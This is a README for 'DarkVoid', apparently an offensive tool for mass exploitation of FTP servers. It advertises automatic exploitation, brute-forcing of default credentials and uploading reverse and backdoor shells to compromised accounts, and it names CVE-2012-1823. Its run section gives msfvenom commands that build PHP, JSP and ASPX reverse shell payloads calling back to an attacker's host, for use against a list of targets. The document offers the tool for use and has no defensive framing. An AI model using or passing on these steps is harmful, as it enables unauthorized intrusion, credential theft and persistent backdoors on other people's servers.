[DARKVOID V1.2]

<img src="https://github.com/darkseid-security/DarkVoid/blob/main/IMG/Screenshot%20at%202022-12-04%2005-17-11.png">

Mass FTP exploitation tool, automates vulnerbility scanning and exploiting FTP servers.

Features:
- Detects FTP service version and alerts you if server is vulnerable to RCE(Remote Code Execution)
- Automatic exploitation
- Built in exploits
- Tries anonymous login
- Tries to upload a shell if anonymous login is successful
- Bruteforce default creds
- If bruteforce is successful program will try and upload a reverse shell through FTP for every cracked account
- Logs cracked user accounts and compromise FTP server via backdoor shell
- [*New Feature] Identifies webserver version and serves payload based on accepted webserver file types
- [*New Feature] Updated UI design
- [*New Feature] Added CVE-2012-1823 

Supports:
- All operating systems running python enviroment
- Exploit support for Pureftp,Proftp and vsFTP
- Exploits for Windows and Linux

TODO:
- Add more exploits
- Test proFTPD 1.3.2rc3 exploit 

Run 
==============
Add targets to Files/targets.txt
Generate payloads in DarkVoid directory before running scipt

msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php Create a JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp Create a ASPX reverse shell
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx

